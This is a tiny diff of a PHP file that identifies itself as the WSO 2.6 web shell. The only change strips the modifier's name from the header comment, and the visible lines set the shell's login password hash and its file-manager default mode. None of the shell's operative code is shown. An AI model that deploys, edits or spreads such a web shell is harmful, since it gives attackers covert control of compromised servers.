@@ -1,5 +1,5 @@
 <?php
-/* WSO 2.6 modified by Vite Haxor */ 
+/* WSO 2.6 modified by  */ 
 $auth_pass = "a727563903d3000164c58f515fb96a52";
 $color = "white";
 $default_action = 'FilesMan';
